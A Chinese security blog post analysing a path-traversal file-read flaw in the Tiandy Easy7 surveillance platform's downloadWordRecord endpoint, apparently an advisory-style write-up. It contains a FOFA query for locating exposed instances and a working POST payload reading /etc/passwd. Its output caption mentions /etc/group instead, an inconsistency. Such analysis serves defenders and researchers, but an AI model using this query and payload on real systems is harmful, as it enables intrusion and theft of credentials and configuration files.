---
title: "天地伟业Easy7 downloadWordRecord 文件读取漏洞"
source: https://mrxn.net/jswz/easy7-file-downloadWordRecord-file-read.html
asset_dir: assets/天地伟业easy7-downloadwordrecord-文件读取漏洞
---

# 天地伟业Easy7 downloadWordRecord 文件读取漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/2/7 08:37
- 260浏览
- [0评论](#comment)
- 31分钟阅读

深入探索

漏洞扫描器

漏洞修复方案

安全运维咨询

---

# 漏洞简介

天地伟业Easy7是一款用于视频监控管理的[软件](#)系统。

漏洞修复方案

该系统的/Easy7/rest/file/downloadWordRecord接口存在前台任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞，攻击者通过构造恶意路径参数（如/etc/passwd）可读取服务器上的任意文件，可能导致敏感信息泄露（如系统配置文件、用户凭证等）。由于天地伟业产品多用于关键基础设施领域，若存在公网暴露实例，可能带来严重的安全风险。

# 影响版本

# fofa语法

> body="/Easy7/apps/WebService/LogIn.jsp" || body="Easy7/VideoLib.EXE" || body="/Easy7/index.html" || (body="<img src=\"./images/ico/Easy7\_logo\_transparent.png") && title="平台"

# 漏洞分析

首先，该系统基于Spring 3.0，比较古老且WEB-INF/web.xml里没有配置任何filter进行权限校验，因此绝大部分接口都是可以直接访问的。

物流软件安全

再来看本次的漏洞接口 /Easy7/rest/file/downloadWordRecord 的对应方法`downloadWordRecord()`的实现逻辑

```
@Controller
@RequestMapping({"/file"})
public class CLS_REST_File {
    @Resource(
        name = "boSystemInfo"
    )
    private CLS_BO_SystemInfo boSystemInfo;
    @Resource(
        name = "boFile"
    )
    private CLS_BO_File boFile;
    @Resource(
        name = "boPROXY"
    )
    private CLS_BO_PROXY boPROXY;
    private static final Log log = LogFactory.getLog(CLS_REST_File.class);

    @RequestMapping({"/downloadWordRecord"})
    public void downloadWordRecord(HttpServletRequest request, HttpServletResponse response, CLS_VO_File voFile) throws IOException {
        String path = CLS_Easy7_Types.file_path_znxc;
        CLS_VO_Result result = new CLS_VO_Result();
        String fileName = voFile.getFileName();
        String fullName = voFile.getFullName();
        String newPath = path + fileName;
        File isFile = new File(newPath);
        if (!isFile.exists()) {
            result.setRet(-7);
            response.getWriter().print(JSONObject.fromObject(result));
        } else {
            ServletOutputStream out = response.getOutputStream();
            String retFilename = "";
            if (fullName != null && !"".equals(fullName)) {
                retFilename = fullName;
            } else {
                retFilename = fileName;
            }

            String ofileName = URLEncoder.encode(retFilename, "UTF-8");
            response.setHeader("Content-disposition", "attachment;filename=" + new String(ofileName.getBytes("UTF-8"), "UTF-8") + ".doc");
            BufferedInputStream bis = null;
            BufferedOutputStream bos = null;

            try {
                InputStream inputStream = new FileInputStream(newPath);
                bis = new BufferedInputStream(inputStream);
                bos = new BufferedOutputStream(out);
                byte[] buff = new byte[2048];

                int bytesRead;
                while((bytesRead = bis.read(buff, 0, buff.length)) != -1) {
                    bos.write(buff, 0, bytesRead);
                }

                this.forwardInquestLog(request.getLocalPort(), voFile.getFullName());
```

深入探索

数据库

安全

在线安全工具

其中 `String path = CLS_Easy7_Types.file_path_znxc;`为配置文件`WEB-INF/classes/config.properties`中配置的`file_path_znxc`的值，是固定的，然后将用户传递的参数fileName作为文件路径一部分传递进`new FileInputStream(newPath);`中进行文件操作，整个过程无任何校验或过滤，因此造成任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞。

# 漏洞复现

```
POST /Easy7/rest/file/downloadWordRecord HTTP/1.1
Host: easy7.mrxn.net
Content-Type: application/x-www-form-urlencoded

fullName=1.png&fileName=../../../etc/passwd
```

[![天地伟业Easy7 downloadWordRecord 文件读取漏洞](images/img-001-82990e00dc7e.webp)](https://image.mrxn.net/43d012ea039342a09c1472b1af8e187b.webp)

成功读取到/etc/group文件内容

漏洞修复方案

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
